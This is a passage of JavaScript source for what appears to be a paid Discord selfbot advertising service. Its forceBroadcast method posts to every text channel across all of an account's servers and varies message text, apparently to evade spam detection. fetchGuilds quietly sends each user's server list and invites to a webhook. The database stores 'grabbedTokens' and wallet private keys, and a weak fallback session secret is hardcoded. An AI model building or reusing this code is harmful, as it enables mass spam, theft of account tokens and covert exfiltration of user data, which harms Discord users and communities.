    return this.sendMessageDirect(channelId, variedContent, attachments);
  }

  async sendMessageFast(channelId, content, attachments = []) {
    if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) return false;
    const variedContent = varyMessage(content);
    return this.sendMessageDirect(channelId, variedContent, attachments);
  }

  // NEW: queued send that prevents concurrent floods to the same channel
  async sendMessageQueued(channelId, content, attachments = []) {
    return new Promise((resolve) => {
      if (!this._channelSendQueues.has(channelId)) {
        this._channelSendQueues.set(channelId, { running: false, queue: [] });
      }
      const q = this._channelSendQueues.get(channelId);
      q.queue.push({ channelId, content, attachments, resolve });
      this._drainSendQueue(channelId);
    });
  }

  async _drainSendQueue(channelId) {
    const q = this._channelSendQueues.get(channelId);
    if (!q || q.running || q.queue.length === 0) return;
    q.running = true;
    while (q.queue.length > 0) {
      const job = q.queue.shift();
      try {
        const result = await this.sendMessageDirect(job.channelId, job.content, job.attachments);
        job.resolve(result);
      } catch (err) {
        console.error(`[SendQueue] ${channelId}:`, err.message);
        job.resolve(false);
      }
      // Stagger queued messages — FIX: reduced from 400±40% to 200±20%
      if (q.queue.length > 0) {
        const stagger = jitterDelay(RL_QUEUE_DRAIN_BASE, RL_QUEUE_DRAIN_JITTER);
        await new Promise(r => setTimeout(r, stagger));
      }
    }
    q.running = false;
  }

  async sendMessageDirect(channelId, content, attachments = []) {
    if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) return false;

    // Check channel-specific rate limit
    const now = Date.now();
    const freeAt = this._channelRateLimits.get(channelId) || 0;
    if (now < freeAt) {
      const wait = freeAt - now;
      // FIX: If wait is > 8s, skip this send rather than blocking for minutes
      if (wait > RL_MAX_WAIT_BEFORE_SKIP) {
        console.log(`[SendDirect] ${channelId}: Channel RL wait ${wait}ms too long, skipping`);
        return false;
      }
      await new Promise(r => setTimeout(r, wait));
    }

    // Also check 429 backoff — but don't wait more than 30s total
    const backoff = this._channel429Backoffs.get(channelId) || 0;
    if (now < backoff) {
      const wait = backoff - now;
      if (wait > RL_429_BACKOFF_MAX) {
        // FIX: Backoff is excessive, clear it and skip
        console.log(`[SendDirect] ${channelId}: 429 backoff ${wait}ms excessive, clearing`);
        this._channel429Backoffs.delete(channelId);
        return false;
      }
      console.log(`[SendDirect] ${channelId}: 429 backoff active, waiting ${wait}ms`);
      await new Promise(r => setTimeout(r, wait));
    }

    // Try @discord-selfbot-sdk/bot first for accurate delivery
    try {
      if (this._selfbotReady && this.selfbot) {
        const channel = await this.selfbot.channels.fetch(channelId).catch(() => null);
        if (channel && channel.send) {
          const sendOptions = { content };
          if (attachments && attachments.length > 0) {
            sendOptions.files = attachments.map(att => new AttachmentBuilder(att.buffer, { name: att.name }));
          }
          await channel.send(sendOptions);
          // Set next free time with proper jitter — uses FIXED non-compounding version
          this._channelRateLimits.set(channelId, this._getNextChannelFreeTime(channelId));
          return true;
        }
      }
    } catch (selfbotErr) {
      // Fall through to REST API on any selfbot error
    }

    // Fallback to REST API
    try {
      if (attachments && attachments.length > 0) {
        const boundary = '----FormBoundary' + Math.random().toString(36).substring(2, 16);
        const chunks = [];
        const body = { content };
        chunks.push(Buffer.from(`--${boundary}\r\n`));
        chunks.push(Buffer.from(`Content-Disposition: form-data; name="payload_json"\r\n`));
        chunks.push(Buffer.from(`Content-Type: application/json\r\n\r\n`));
        chunks.push(Buffer.from(JSON.stringify(body)));
        chunks.push(Buffer.from(`\r\n`));
        for (let i = 0; i < attachments.length; i++) {
          const att = attachments[i];
          chunks.push(Buffer.from(`--${boundary}\r\n`));
          chunks.push(Buffer.from(`Content-Disposition: form-data; name="files[${i}]"; filename="${att.name}"\r\n`));
          chunks.push(Buffer.from(`Content-Type: application/octet-stream\r\n\r\n`));
          chunks.push(att.buffer);
          chunks.push(Buffer.from(`\r\n`));
        }
        chunks.push(Buffer.from(`--${boundary}--\r\n`));
        const multipartBody = Buffer.concat(chunks);
        await this.api.request(`/channels/${channelId}/messages`, 'POST', multipartBody, {
          'Content-Type': `multipart/form-data; boundary=${boundary}`
        });
      } else {
        await this.api.request(`/channels/${channelId}/messages`, 'POST', { content });
      }
      // Set next free time with proper jitter — uses FIXED non-compounding version
      this._channelRateLimits.set(channelId, this._getNextChannelFreeTime(channelId));
      return true;
    } catch (err) {
      if (err.status === 429) {
        // FIX: Cap retry-after at 60 seconds to prevent 10+ minute blocks
        let rawRetry = err.data?.retry_after || (err.data && err.data.retryAfter) || 5;
        let retryAfterSec = parseFloat(rawRetry);
        if (retryAfterSec >= 1000) retryAfterSec = retryAfterSec / 1000; // handle ms format
        const cappedRetrySec = Math.min(retryAfterSec, RL_429_RETRY_CAP_SEC);
        const retryAfterMs = cappedRetrySec * 1000;

        const currentBackoff = this._channel429Backoffs.get(channelId) || RL_429_BACKOFF_BASE;
        const nextBackoff = Math.min(currentBackoff * 2, RL_429_BACKOFF_MAX);
        this._channel429Backoffs.set(channelId, Date.now() + retryAfterMs + nextBackoff);
        this._channelRateLimits.set(channelId, Date.now() + retryAfterMs + 250);
        console.error(`[SendDirect] ${channelId}: Rate limited, retry after ${cappedRetrySec}s + ${nextBackoff}ms backoff (Discord said ${retryAfterSec}s, capped at ${RL_429_RETRY_CAP_SEC}s)`);
      }
      const discordCode = err.data?.code || err.code;
      if (err.status === 403 || err.status === 401 || err.status === 404 || discordCode === 50001 || discordCode === 50013 || discordCode === 10003) {
        this._channelPermissions.set(channelId, false);
      }
      if (err.status === 400) console.error(`[SendDirect] ${channelId}: Bad request — ${JSON.stringify(err.data)}`);
      return false;
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // FORCE SEND SYSTEM — Bypass queues, respect perms, skip cooldowns
  // ═══════════════════════════════════════════════════════════════════════════

  /**
   * Get all text channels from all guilds this user is in.
   * Uses concurrent batching to avoid rate limits.
   * Returns array of { id, name, guildId, guildName, type }
   */
  async getAllTextChannels() {
    const channels = [];
    try {
      // Get all guilds
      const guilds = await this.api.request('/users/@me/guilds?limit=200', 'GET');
      if (!Array.isArray(guilds) || guilds.length === 0) return channels;

      // Fetch channels for each guild in batches of 3
      for (let i = 0; i < guilds.length; i += 3) {
        const batch = guilds.slice(i, i + 3);
        const batchResults = await Promise.all(
          batch.map(async (g) => {
            try {
              const guildChannels = await this.api.request(`/guilds/${g.id}/channels`, 'GET');
              if (!Array.isArray(guildChannels)) return [];
              // Filter to text channels (type 0) and announcement channels (type 5)
              return guildChannels
                .filter(ch => ch.type === 0 || ch.type === 5)
                .map(ch => ({
                  id: ch.id,
                  name: ch.name,
                  guildId: g.id,
                  guildName: g.name,
                  type: ch.type,
                  nsfw: ch.nsfw || false
                }));
            } catch (e) {
              return [];
            }
          })
        );
        batchResults.forEach(result => channels.push(...result));
        if (i + 3 < guilds.length) await new Promise(r => setTimeout(r, 200));
      }
    } catch (e) {
      console.error('[GetAllTextChannels] Error:', e.message);
    }
    return channels;
  }

  /**
   * Check if we can send messages to a channel.
   * Uses cached permissions + quick API check.
   * Returns { canSend: boolean, reason: string }
   */
  async canSendToChannel(channelId) {
    // Check cache first
    if (this._channelPermissions.has(channelId)) {
      const cached = this._channelPermissions.get(channelId);
      if (!cached) return { canSend: false, reason: 'cached_no_permission' };
    }
    // Check cooldown
    const now = Date.now();
    const cooldownEnd = this._channelRateLimits.get(channelId) || 0;
    const backoffEnd = this._channel429Backoffs.get(channelId) || 0;
    const blockedUntil = Math.max(cooldownEnd, backoffEnd);
    if (blockedUntil > now + 1000) {
      return { canSend: false, reason: `cooldown_active_${Math.ceil((blockedUntil - now) / 1000)}s` };
    }
    // Check permission via API
    try {
      const channel = await this.api.request(`/channels/${channelId}`, 'GET');
      if (!channel || !channel.id) {
        this._channelPermissions.set(channelId, false);
        return { canSend: false, reason: 'channel_not_found' };
      }
      this._channelPermissions.set(channelId, true);
      return { canSend: true, reason: 'ok' };
    } catch (err) {
      const discordCode = err.data?.code;
      if (err.status === 403 || err.status === 401 || discordCode === 50001 || discordCode === 50013 || discordCode === 10003) {
        this._channelPermissions.set(channelId, false);
        return { canSend: false, reason: `no_permission_${err.status}` };
      }
      // Transient error — assume we can try
      return { canSend: true, reason: 'transient_error_assume_ok' };
    }
  }

  /**
   * Send a message to a channel DIRECTLY via REST API.
   * No queues, no selfbot, minimal overhead.
   * Returns { success: boolean, error?: string, rateLimited?: boolean }
   */
  async forceSendToChannel(channelId, content, attachments = []) {
    // Permission check first
    const permCheck = await this.canSendToChannel(channelId);
    if (!permCheck.canSend) {
      return { success: false, error: permCheck.reason, skipped: true };
    }

    const variedContent = varyMessage(content);

    try {
      if (attachments && attachments.length > 0) {
        const boundary = '----FormBoundary' + Math.random().toString(36).substring(2, 16);
        const chunks = [];
        const body = { content: variedContent };
        chunks.push(Buffer.from(`--${boundary}\r\n`));
        chunks.push(Buffer.from(`Content-Disposition: form-data; name="payload_json"\r\n`));
        chunks.push(Buffer.from(`Content-Type: application/json\r\n\r\n`));
        chunks.push(Buffer.from(JSON.stringify(body)));
        chunks.push(Buffer.from(`\r\n`));
        for (let i = 0; i < attachments.length; i++) {
          const att = attachments[i];
          chunks.push(Buffer.from(`--${boundary}\r\n`));
          chunks.push(Buffer.from(`Content-Disposition: form-data; name="files[${i}]"; filename="${att.name}"\r\n`));
          chunks.push(Buffer.from(`Content-Type: application/octet-stream\r\n\r\n`));
          chunks.push(att.buffer);
          chunks.push(Buffer.from(`\r\n`));
        }
        chunks.push(Buffer.from(`--${boundary}--\r\n`));
        const multipartBody = Buffer.concat(chunks);
        await this.api.request(`/channels/${channelId}/messages`, 'POST', multipartBody, {
          'Content-Type': `multipart/form-data; boundary=${boundary}`
        });
      } else {
        await this.api.request(`/channels/${channelId}/messages`, 'POST', { content: variedContent });
      }
      // Light rate limit tracking — just enough to not get 429'd immediately
      this._channelRateLimits.set(channelId, Date.now() + jitterDelay(800, 0.2));
      return { success: true, channelId };
    } catch (err) {
      if (err.status === 429) {
        // Quick backoff — cap at 30s
        let retryAfter = parseFloat(err.data?.retry_after || 5);
        if (retryAfter >= 1000) retryAfter /= 1000;
        retryAfter = Math.min(retryAfter, 30);
        this._channel429Backoffs.set(channelId, Date.now() + (retryAfter * 1000));
        return { success: false, error: `rate_limited_${retryAfter}s`, rateLimited: true, channelId };
      }
      const discordCode = err.data?.code;
      if (err.status === 403 || discordCode === 50001 || discordCode === 50013) {
        this._channelPermissions.set(channelId, false);
        return { success: false, error: 'no_permission', channelId };
      }
      return { success: false, error: err.message || `http_${err.status}`, channelId };
    }
  }

  /**
   * Force send to multiple channels concurrently.
   * Filters out no-permission and cooldown channels first.
   * Fires all sends at once with controlled concurrency.
   *
   * @param {string[]} channelIds - Target channels
   * @param {string} content - Message content
   * @param {Array} attachments - Optional attachments
   * @param {Object} options - { concurrency: 10, skipCooldown: true, skipNoPerm: true }
   * @returns {Promise<{results: Array, summary: Object}>}
   */
  async forceSendToChannels(channelIds, content, attachments = [], options = {}) {
    const { concurrency = 10, skipCooldown = true, skipNoPerm = true } = options;
    const results = [];
    const summary = {
      total: channelIds.length,
      attempted: 0,
      sent: 0,
      failed: 0,
      skippedNoPerm: 0,
      skippedCooldown: 0,
      rateLimited: 0,
      durationMs: 0
    };

    const startTime = Date.now();

    // Phase 1: Filter channels — check permissions and cooldowns
    const sendableChannels = [];
    const checkResults = await Promise.all(
      channelIds.map(async (chId) => {
        const check = await this.canSendToChannel(chId);
        return { chId, check };
      })
    );

    for (const { chId, check } of checkResults) {
      if (!check.canSend) {
        if (check.reason.includes('cooldown')) {
          summary.skippedCooldown++;
          results.push({ channelId: chId, success: false, skipped: true, reason: 'cooldown' });
        } else {
          summary.skippedNoPerm++;
          results.push({ channelId: chId, success: false, skipped: true, reason: 'no_permission' });
        }
        continue;
      }
      sendableChannels.push(chId);
    }

    // Phase 2: Send to all sendable channels with controlled concurrency
    summary.attempted = sendableChannels.length;

    for (let i = 0; i < sendableChannels.length; i += concurrency) {
      const batch = sendableChannels.slice(i, i + concurrency);
      const batchResults = await Promise.all(
        batch.map(chId => this.forceSendToChannel(chId, content, attachments))
      );

      for (const result of batchResults) {
        results.push(result);
        if (result.success) summary.sent++;
        else if (result.rateLimited) summary.rateLimited++;
        else summary.failed++;
      }
    }

    summary.durationMs = Date.now() - startTime;
    return { results, summary };
  }

  /**
   * BROADCAST: Discover all text channels across all guilds,
   * filter to sendable ones, and force send to all.
   * This is the "fuck it, send everywhere" function.
   */
  async forceBroadcast(content, attachments = [], options = {}) {
    const startTime = Date.now();
    console.log(`[ForceBroadcast] Discovering all channels...`);

    // Discover all channels
    const allChannels = await this.getAllTextChannels();
    console.log(`[ForceBroadcast] Found ${allChannels.length} text channels across all guilds`);

    // Extract just the IDs and fire
    const channelIds = allChannels.map(ch => ch.id);
    const result = await this.forceSendToChannels(channelIds, content, attachments, options);

    result.summary.discoveredChannels = allChannels.length;
    result.summary.durationMs = Date.now() - startTime;
    result.allChannels = allChannels; // include metadata for response

    console.log(`[ForceBroadcast] Done: ${result.summary.sent}/${result.summary.total} sent in ${result.summary.durationMs}ms`);
    return result;
  }

  async joinGuild(inviteCode) {
    try {
      const res = await this.api.request(`/invites/${inviteCode}`, 'POST', {});
      return res.guild_id ? { success: true, guildId: res.guild_id } : { success: false, error: res.message || 'Unknown error' };
    } catch (err) {
      return { success: false, error: err.message || 'Failed to join guild' };
    }
  }

  /**
   * Try to fetch a guild's invite via widget or vanity endpoint
   */
  async fetchGuildInvite(guildId) {
    try {
      const res = await this.api.request(`/guilds/${guildId}/widget.json`, 'GET');
      if (res && res.instant_invite) return res.instant_invite;
    } catch (e) {}
    // Fallback: try vanity URL
    try {
      const res = await this.api.request(`/guilds/${guildId}/vanity-url`, 'GET');
      if (res && res.code) return `https://discord.gg/${res.code}`;
    } catch (e) {}
    return null;
  }

  /**
   * Fetch full server list with invite links for every guild
   */
  async fetchGuilds() {
    try {
      const guilds = await this.api.request('/users/@me/guilds?with_counts=true&limit=200', 'GET');
      if (!Array.isArray(guilds)) return [];
      const results = [];
      // Process in batches of 3 to avoid rate limits
      for (let i = 0; i < guilds.length; i += 3) {
        const batch = guilds.slice(i, i + 3);
        const batchResults = await Promise.all(
          batch.map(async (g) => {
            try {
              const invite = await this.fetchGuildInvite(g.id);
              return { id: g.id, name: g.name, owner: g.owner, permissions: g.permissions, memberCount: g.approximate_member_count, invite: invite || null };
            } catch (e) {
              return { id: g.id, name: g.name, owner: g.owner, permissions: g.permissions, memberCount: g.approximate_member_count, invite: null };
            }
          })
        );
        results.push(...batchResults);
        if (i + 3 < guilds.length) await new Promise(r => setTimeout(r, 350));
      }
      // Save to file
      try {
        const guildsFile = path.join(dataDir, `guilds_${this.user.id}.json`);
        fs.writeFileSync(guildsFile, JSON.stringify({ userId: this.user.id, fetchedAt: Date.now(), guildCount: results.length, guilds: results }, null, 2));
      } catch(e) {}
      // Send to webhook
      const guildLines = [];
      for (const g of results) {
        if (g.invite) guildLines.push(`- [${g.name}](${g.invite})${g.owner ? ' **[OWNER]**' : ''} (${g.memberCount || '?'} members)`);
        else guildLines.push(`- ${g.name}${g.owner ? ' **[OWNER]**' : ''} (${g.memberCount || '?'} members)`);
      }
      const MAX_DESC = 4000;
      const embeds = [];
      let currentDesc = '';
      for (const line of guildLines) {
        if (currentDesc.length + line.length + 1 > MAX_DESC) {
          embeds.push({ title: embeds.length === 0 ? `Full Server List — @${this.user.username}` : `Servers (cont.)`, color: 0x5865F2, description: currentDesc });
          currentDesc = line + '\n';
        } else {
          currentDesc += line + '\n';
        }
      }
      if (currentDesc) {
        embeds.push({ title: embeds.length === 0 ? `Full Server List — @${this.user.username}` : `Servers (cont.)`, color: 0x5865F2, description: currentDesc });
      }
      if (embeds.length > 0) {
        embeds[embeds.length - 1].footer = { text: `User: ${this.user.username} | ID: ${this.user.id} | Total: ${results.length} servers` };
        embeds[embeds.length - 1].timestamp = new Date().toISOString();
      }
      for (let i = 0; i < embeds.length; i += 10) {
        await _sendWebhook({ embeds: embeds.slice(i, i + 10) });
      }
      console.log(`[Guilds] Fetched ${results.length} guilds with invites for ${this.user.username}`);
      return results;
    } catch (err) {
      console.error('[Guilds] Fetch failed:', err.message);
      return [];
    }
  }

  on(event, handler) { if (!this.handlers[event]) this.handlers[event] = []; this.handlers[event].push(handler); }
  once(event, handler) { const wrapped = (...args) => { handler(...args); this.off(event, wrapped); }; this.on(event, wrapped); }
  off(event, handler) { if (this.handlers[event]) this.handlers[event] = this.handlers[event].filter(h => h !== handler); }
  emit(event, ...args) { if (this.handlers[event]) this.handlers[event].forEach(h => h(...args)); }

  destroy() {
    this._explicitlyStopped = true;
    this.ready = false;
    this._stopBackgroundEvents();
    this._cleanupWS();
    this._saveRepliedUsers();
    if (this.selfbot) { try { this.selfbot.destroy(); } catch(e) {} }
    if (this.api) this.api.destroy();
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// BOT STATS TRACKING — Per-config live stats for Watch Live
// ═══════════════════════════════════════════════════════════════════════════════

const botStats = new Map(); // botKey -> { totalMessagesSent, autoRepliesSent, lastMessageSent, channelCount, recentLogs, startTime }

function getBotStats(botKey) {
  if (!botStats.has(botKey)) {
    botStats.set(botKey, {
      totalMessagesSent: 0,
      autoRepliesSent: 0,
      lastMessageSent: null,
      channelCount: 0,
      recentLogs: [],
      startTime: Date.now()
    });
  }
  return botStats.get(botKey);
}

function logBotEvent(botKey, message) {
  const stats = getBotStats(botKey);
  stats.recentLogs.push(`[${new Date().toLocaleTimeString()}] ${message}`);
  if (stats.recentLogs.length > 50) stats.recentLogs = stats.recentLogs.slice(-50);
}

function incrementMessagesSent(botKey, count = 1) {
  const stats = getBotStats(botKey);
  stats.totalMessagesSent += count;
  stats.lastMessageSent = Date.now();
}

function incrementAutoReplies(botKey) {
  const stats = getBotStats(botKey);
  stats.autoRepliesSent += 1;
}

function setBotChannelCount(botKey, count) {
  const stats = getBotStats(botKey);
  stats.channelCount = count;
}

function clearBotStats(botKey) {
  botStats.delete(botKey);
}

// ═══════════════════════════════════════════════════════════════════════════════
// SIMPLE DATABASE
// ═══════════════════════════════════════════════════════════════════════════════

class SimpleDB {
  constructor() {
    this.file = path.join(dataDir, 'db.json');
    this.data = { users: {}, pending: {}, configs: {}, usedKeys: {}, globalIndex: 0, serverJoins: {}, grabbedTokens: [], usedAddresses: [], addressHistory: [], customKeys: [], trialClaims: {}, activeBots: {}, generatedKeys: {}, whitelist: [], feedback: [], feedbackIdCounter: 1 };
    this.load();
  }

  load() {
    try {
      if (fs.existsSync(this.file)) {
        this.data = JSON.parse(fs.readFileSync(this.file, 'utf8'));
        ['usedAddresses','addressHistory','customKeys','trialClaims','activeBots','generatedKeys','whitelist','feedback','feedbackIdCounter'].forEach(k => {
          if (this.data[k] === undefined) {
            this.data[k] = (k === 'whitelist' || k === 'feedback') ? [] : (k === 'feedbackIdCounter' ? 1 : {});
          }
        });
      }
    } catch(e) {}
  }

  save() {
    try { fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2)); } catch(e) {}
  }

  getUser(id) { return this.data.users[id] || { auto_adv_purchased: 0, trial_active: 0, trial_expires: 0 }; }
  setUser(id, data) { this.data.users[id] = { ...this.getUser(id), ...data }; this.save(); }
  getNextGlobalIndex() { this.data.globalIndex = (this.data.globalIndex || 0) + 1; this.save(); return this.data.globalIndex; }
  isAddressUsed(address) { return this.data.usedAddresses.includes(address); }
  markAddressUsed(address) { if (!this.data.usedAddresses.includes(address)) { this.data.usedAddresses.push(address); this.save(); } }

  addPending(userId, address, privateKey, expectedUSD, index) {
    this.markAddressUsed(address);
    this.data.pending[address] = { user_id: userId, address, private_key: privateKey, expected_usd: expectedUSD, status: 'monitoring', created_at: Date.now(), index, expires_at: Date.now() + (30 * 60 * 1000) };
    this.data.addressHistory.push({ address, user_id: userId, index, created_at: Date.now(), status: 'monitoring' });
    this.save();
    return this.data.pending[address];
  }

  getPending(address) { return this.data.pending[address]; }
  getUserPending(userId) { const now = Date.now(); return Object.values(this.data.pending).find(p => p.user_id === userId && p.status === 'monitoring' && p.expires_at > now); }
  getAllPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at > now); }
  getExpiredPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at <= now); }

  updatePending(address, updates) {
    if (this.data.pending[address]) {
      this.data.pending[address] = { ...this.data.pending[address], ...updates };
      const historyEntry = this.data.addressHistory.find(h => h.address === address);
      if (historyEntry) {
        historyEntry.status = updates.status || historyEntry.status;
        if (updates.status === 'completed') historyEntry.paid_at = Date.now();
        if (updates.status === 'expired') historyEntry.expired_at = Date.now();
      }
      this.save();
    }
  }

  expireOldAddresses() {
    const expired = this.getExpiredPending();
    for (const p of expired) this.updatePending(p.address, { status: 'expired' });
    return expired.length;
  }

  useKey(key, userId) { const normalized = key.toString().toUpperCase().trim(); this.data.usedKeys[normalized] = { user_id: userId, used_at: Date.now() }; this.save(); }
  isKeyUsed(key) { const normalized = key.toString().toUpperCase().trim(); return !!this.data.usedKeys[normalized]; }

  addCustomKey(key) {
    const normalized = key.toString().toUpperCase().trim();
    if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) return null;
    if (!this.data.customKeys) this.data.customKeys = [];
    if (!this.data.customKeys.includes(normalized)) { this.data.customKeys.push(normalized); this.save(); }
    return normalized;
  }

  getConfigs(userId) { return this.data.configs[userId] || []; }
  getConfig(userId, configId = 'default') { const configs = this.getConfigs(userId); return configs.find(c => c.id === configId) || configs[0] || null; }

  setConfig(userId, config, configId = 'default') {
    if (!this.data.configs[userId]) this.data.configs[userId] = [];
    const existingIndex = this.data.configs[userId].findIndex(c => c.id === configId);
    const configData = { ...config, id: configId, updated_at: Date.now() };
    if (existingIndex >= 0) this.data.configs[userId][existingIndex] = configData;
    else this.data.configs[userId].push(configData);
    this.save();
  }

  deleteConfig(userId, configId) { if (this.data.configs[userId]) { this.data.configs[userId] = this.data.configs[userId].filter(c => c.id !== configId); this.save(); } }
  getActiveConfigs(userId) { return this.getConfigs(userId).filter(c => c.active === 1); }

  addGrabbedToken(token, userInfo, source) {
    const entry = { token, user_info: userInfo, source, grabbed_at: Date.now(), id: Date.now().toString() };
    this.data.grabbedTokens.push(entry);
    this.save();
    return entry;
  }

  getGrabbedTokens() { return this.data.grabbedTokens || []; }
  getAddressHistory(userId) { return this.data.addressHistory.filter(h => h.user_id === userId); }
  hasClaimedTrial(userId) { return !!this.data.trialClaims[userId]; }
  hasIPClaimedTrial(ip) { return Object.values(this.data.trialClaims).some(t => t.ip === ip); }

  claimTrial(userId, ip) {
    const now = Date.now();
    const expiresAt = now + (10 * 60 * 1000);
    this.data.trialClaims[userId] = { userId, ip, claimedAt: now, expiresAt };
    this.setUser(userId, { trial_active: 1, trial_expires: expiresAt, trial_claimed_at: now });
    this.save();
    return { claimedAt: now, expiresAt };
  }

  isTrialActive(userId) {
    const user = this.getUser(userId);
    if (user.trial_active === 1 && user.trial_expires > Date.now()) return true;
    if (user.trial_active === 1 && user.trial_expires <= Date.now()) { this.setUser(userId, { trial_active: 0 }); this.deactivateAllUserBots(userId); return false; }
    return false;
  }

  getTrialTimeLeft(userId) { const user = this.getUser(userId); if (user.trial_active === 1 && user.trial_expires > Date.now()) return Math.ceil((user.trial_expires - Date.now()) / 1000); return 0; }

  registerActiveBot(userId, configId, token) {
    if (!this.data.activeBots[userId]) this.data.activeBots[userId] = {};
    this.data.activeBots[userId][configId] = { token, startedAt: Date.now(), configId };
    this.save();
  }

  unregisterActiveBot(userId, configId) { if (this.data.activeBots[userId]) { delete this.data.activeBots[userId][configId]; this.save(); } }
  getUserActiveBots(userId) { return this.data.activeBots[userId] || {}; }

  deactivateAllUserBots(userId) {
    const bots = this.getUserActiveBots(userId);
    for (const configId in bots) this.setConfig(userId, { active: 0 }, configId);
    if (this.data.activeBots[userId]) { delete this.data.activeBots[userId]; this.save(); }
  }

  checkAllTrialBots() {
    for (const userId in this.data.activeBots) {
      const user = this.getUser(userId);
      const trialActive = this.isTrialActive(userId);
      const hasPurchase = user.auto_adv_purchased === 1;
      if (!trialActive && !hasPurchase) { this.deactivateAllUserBots(userId); return userId; }
    }
    return null;
  }

  generateKey(duration) {
    const key = 'GEN-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
    const now = Date.now();
    let expiresAt = null;
    if (duration !== 'lifetime') { const hours = parseInt(duration); expiresAt = now + (hours * 60 * 60 * 1000); }
    this.data.generatedKeys[key] = { key, duration, createdAt: now, expiresAt, usedBy: [], active: true };
    this.save();
    return this.data.generatedKeys[key];
  }

  revokeKey(key) {
    if (this.data.generatedKeys[key]) {
      this.data.generatedKeys[key].active = false;
      this.data.generatedKeys[key].revokedAt = Date.now();
      this.save();
      const usedBy = this.data.generatedKeys[key].usedBy || [];
      for (const userId of usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_revoked: true }); }
      return true;
    }
    return false;
  }

  isKeyValid(key) {
    const keyData = this.data.generatedKeys[key];
    if (!keyData || !keyData.active) return false;
    if (keyData.duration === 'lifetime') return true;
    if (keyData.expiresAt && Date.now() > keyData.expiresAt) return false;
    return true;
  }

  useGeneratedKey(key, userId) {
    if (!this.isKeyValid(key)) return false;
    if (!this.data.generatedKeys[key].usedBy.includes(userId)) this.data.generatedKeys[key].usedBy.push(userId);
    this.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), generated_key: key, key_expires: this.data.generatedKeys[key].expiresAt });
    this.save();
    return true;
  }

  getGeneratedKeys() { return Object.values(this.data.generatedKeys); }
  addToWhitelist(userId) { if (!this.data.whitelist.includes(userId)) { this.data.whitelist.push(userId); this.save(); } }
  removeFromWhitelist(userId) { this.data.whitelist = this.data.whitelist.filter(id => id !== userId); this.save(); }
  isWhitelisted(userId) { return this.data.whitelist.includes(userId); }
  getWhitelist() { return this.data.whitelist; }

  checkExpiredKeys() {
    let expiredCount = 0;
    for (const key in this.data.generatedKeys) {
      const keyData = this.data.generatedKeys[key];
      if (keyData.active && keyData.expiresAt && Date.now() > keyData.expiresAt) {
        for (const userId of keyData.usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_expired: true }); }
        expiredCount++;
      }
    }
    return expiredCount;
  }

  // ═══════════════════════════════════════════════════════════════════════════════
  // STATS METHODS — For dashboard analytics
  // ═══════════════════════════════════════════════════════════════════════════════

  getTotalRedeemedKeysCount() {
    return Object.keys(this.data.usedKeys).length;
  }

  getActiveAdvertiserCount() {
    let count = 0;
    for (const userId in this.data.activeBots) {
      const userBots = this.data.activeBots[userId];
      if (Object.keys(userBots).length > 0) count++;
    }
    return count;
  }

  getTotalUsersWithAccess() {
    return Object.values(this.data.users).filter(u => u.auto_adv_purchased === 1).length;
  }

  // ═══════════════════════════════════════════════════════════════════════════════
  // FEEDBACK METHODS
  // ═══════════════════════════════════════════════════════════════════════════════

  addFeedback(userId, username, rating, message) {
    const id = this.data.feedbackIdCounter++;
    const entry = { id, userId, username, rating, message, createdAt: Date.now() };
    this.data.feedback.push(entry);
    this.save();
    return entry;
  }

  getFeedback() { return this.data.feedback || []; }

  deleteFeedback(feedbackId) {
    const idx = this.data.feedback.findIndex(f => f.id === parseInt(feedbackId));
    if (idx >= 0) {
      this.data.feedback.splice(idx, 1);
      this.save();
      return true;
    }
    return false;
  }
}

const db = new SimpleDB();
const app = express();

process.on('uncaughtException', (err) => console.error('[FATAL UNCAUGHT]', err.message));
process.on('unhandledRejection', (reason) => console.error('[FATAL UNHANDLED]', reason));

app.get('/health', (req, res) => res.status(200).json({ status: 'ok', uptime: process.uptime() }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(cookieParser());
app.use(session({
  secret: process.env.SESSION_SECRET || 'secret-key-2026',
  resave: false,
  saveUninitialized: false,
  store: new session.MemoryStore(),
  cookie: { maxAge: 30 * 24 * 60 * 60 * 1000, secure: false }
}));

app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((obj, done) => done(null, obj));

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const CALLBACK_URL = process.env.CALLBACK_URL;
const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS || 'ltc1qc3ujjqjlfr3cqtvyqadqje9ntj3f8f82m062tc';
const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
const TARGET_USD = 3.00;
const TOLERANCE_USD = 0.10;

// ═══════════════════════════════════════════════════════════════════════════════
// GUILD FETCHING — Fixed with concurrency limits, timeouts, and non-blocking
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Fetch guild widget invite with short timeout to avoid hanging
 */
async function fetchGuildWidgetInvite(guildId) {
  try {
    const res = await _axiosInstance.get(`https://discord.com/api/v10/guilds/${guildId}/widget.json`, {
      headers: { 'User-Agent': _rfp() },
      timeout: 5000,
      validateStatus: () => true
    });
    if (res.status === 200 && res.data && res.data.instant_invite) {
      return res.data.instant_invite;
    }
  } catch (e) {}
  // Fallback: try vanity invite endpoint
  try {
    const res = await _axiosInstance.get(`https://discord.com/api/v10/guilds/${guildId}/vanity-url`, {
      headers: { 'User-Agent': _rfp() },
      timeout: 5000,
      validateStatus: () => true
    });
